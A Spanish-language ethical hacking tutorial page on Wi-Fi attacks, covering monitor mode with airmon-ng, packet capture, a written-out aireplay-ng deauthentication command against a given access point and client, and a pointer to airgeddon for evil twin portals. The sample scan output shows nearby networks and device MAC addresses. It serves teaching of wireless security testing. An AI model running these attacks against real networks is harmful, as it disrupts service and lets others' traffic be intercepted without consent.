# Recursos de Hacking Ético

## Redes inalámbricas: ataques Wi-Fi

### Sniffing

Para recoger información de una red Wi-Fi necesitamos poder ver todos los paquetes que pasan por esa red. Queremos ver los beacons o los paquetes de autenticación que se envían entre el punto de acceso y los dispositivos conectados a la red. Una manera de intentar ver estos datos es usando Whiresark pero para poder ver todos esos paquetes necesitamos una interfaz de red en modo monitor. Para ello podemos usar `airmon-ng` que nos ayuda a convertir una interfaz de red en modo monitor (obviamente necesitamos una antena Wi-Fi que lo soporte).

Para hacer esto simplemente debemos abrirnos una terminal y ejecutar `airmon-ng start [interfaz de red]`. En mi caso será la wlan0 y daría una salida parecida a esto:

```sh
$ sudo airmon-ng start wlan0                                                                                                                                             1 ⨯
[sudo] password for kali:

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    443 NetworkManager
   1147 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           ath9k_htc       Qualcomm Atheros Communications AR9271 802.11n
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

Después podemos ejecutar tcpdump para recoger los paquetes indicandole que queremos usar la interfaz `wlan0mon`. Lo haríamos ejecutando `tcpdump -i wlan0mon`.

### Ataques de deautenticación

Es un ataque que manda constantementes paquetes de deautenticación a un dispositivo para que vuelva a reautenticarse contra el punto de acceso. Para ejecutar este ataque necesitamos saber el BSSID del punto de acceso y la mac del dispositivo al que queremos mandar esos paquetes.

Primero ejecutaríamos `airodump-ng wlan0mon` y nos daría una salida parecida a esta:

```sh

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 00:22:07:B7:B6:E4  -49       21        1    0   1  130   WPA2 CCMP   PSK  ADAMO-B6E5
 E4:26:86:26:79:98  -58       30        3    0   6  130   WPA2 CCMP   PSK  vodafoneBA2412
 C8:B4:22:82:52:0F  -65       29        1    0   6  130   WPA2 CCMP   PSK  MOVISTAR_5200
 F4:69:42:B0:66:4F  -58       23       18    0   1  130   WPA2 CCMP   PSK  MOVISTAR_6640
 C6:D4:A1:D2:40:86  -70       22        0    0   6  130   WPA2 CCMP   PSK  MOVISTAR_6640
 CC:D4:A1:D2:40:86  -72       22        0    0   6  130   WPA2 CCMP   PSK  MOVISTAR_4084
 F8:A2:D6:16:71:6B  -86        6        0    0   6   65   WPA2 CCMP   PSK  DIRECT-PDLAPTOP-M41I03NNmsP7
 5C:B1:3E:9B:58:10  -79        6        0    0  12  195   WPA2 CCMP   PSK  BlackWidow
 04:A2:22:1E:B1:26  -80        5        0    0  11  130   WPA2 CCMP   PSK  MiFibra-B124

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 E4:26:86:26:79:98  66:01:D9:71:D3:CF  -83    0 - 1e     0       13
 F4:69:42:B0:66:4F  28:6D:CD:5E:20:19  -84    0 - 1      0        1
 F4:69:42:B0:66:4F  20:3D:BD:61:EC:8E   -1    1e- 0      0       21
 F4:69:42:B0:66:4F  84:E3:42:06:32:6E  -62    0 - 1e     0        1
 F4:69:42:B0:66:4F  10:52:1C:F2:4E:A7  -72    0 - 6      0        2
 F4:69:42:B0:66:4F  28:6D:CD:5F:48:A0  -74    0 - 1      0        1
 F4:69:42:B0:66:4F  10:52:1C:F2:C4:EF  -77    0 - 6      0        1
 (not associated)   1A:28:EB:E1:2F:16  -89    0 - 1      0        1         MOVISTAR_5200
 (not associated)   3C:CF:5B:01:C8:40  -78    0 - 1      7        3
 (not associated)   6C:00:6B:FD:4A:59  -67    0 - 1     49        9
```

Esto nos muestra en la parte de arriba los puntos de acceso y en la parte de abajo los dispositivos. Una vez que tenemos esta información para mandar un ataque de deautenticación ejecutaríamos:

```
aireplay-ng -0 1000 -a 00:22:07:B7:B6:E4 -c 8c:85:90:5e:31:47 wlan0mon
```

-0 son el numero de paquetes
-a el BSSID del punto de acceso
-c el dispositivo
y por último usamos nuestra interfaz de red.

Este ataque es muy útil cuando queremos generar tráfico en una red, por ejemplo una red WEP para poder obtener la clave de manera más rápida ya que a mayor número de paquetes circulando mayor rapidez para obtener la clave.

### Evil Twin

Un evil twin es un portal de acceso falso pero que parece que es uno real y si logramos que se conecte alguien podemos esnifar todos los paquetes que mande. Hay una herramienta que nos ayuda mucho a essto y es [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon). Está genial y nos va guiando a través de un menu interactivo hasta lograr lo que queramos.



[Volver al inicio](./../../README.md)
